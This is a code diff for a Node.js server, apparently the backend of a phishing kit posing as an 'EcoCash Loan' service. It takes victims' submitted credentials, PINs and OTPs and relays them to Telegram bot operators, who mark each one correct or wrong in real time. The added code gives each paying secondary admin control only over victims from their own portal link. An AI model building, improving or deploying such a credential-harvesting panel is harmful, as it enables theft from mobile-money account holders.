@@ -51,6 +51,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     activeApplications.set(appReference, {
       ...data,
       formattedPhone,
+      portalPath,
       targetChatId,
       status: 'PIN_PENDING'
     });
@@ -267,7 +268,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  // Handle Callback Queries (Main Admin manages payment authorization clicks)
+  // Handle Callback Queries
   const { callback_query } = req.body;
   if (!callback_query) return;
 
@@ -275,6 +276,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const chatId = callback_query.message.chat.id.toString();
   const messageId = callback_query.message.message_id;
 
+  // Main Admin manages payment authorization clicks
   if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
     if (chatId !== masterChatId) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
@@ -320,7 +322,28 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  // PIN verification handlers (routed to the specific admin owning the application session)
+  // Security check: Ensure secondary admins can only control buttons for their own links
+  const expectedAdminChatId = pathToAdminChat.get(callback_query.message.chat.text?.match(/\/Admin-\d{4}/)?.[0] || '') || chatId; 
+  // Let's resolve the target chat from the application reference inside the callback data
+  let targetAppRef = '';
+  if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
+  if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
+  if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
+  if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');
+
+  if (targetAppRef) {
+    const appData = activeApplications.get(targetAppRef);
+    if (appData && appData.targetChatId && chatId !== appData.targetChatId) {
+      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ callback_query_id: callback_query.id, text: "You can only control actions for your own portal link.", show_alert: true })
+      });
+      return;
+    }
+  }
+
+  // PIN verification handlers
   if (actionData.startsWith('pin_correct_')) {
     const appReference = actionData.replace('pin_correct_', '');
     if (activeApplications.has(appReference)) {
@@ -390,4 +413,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
-        
+  
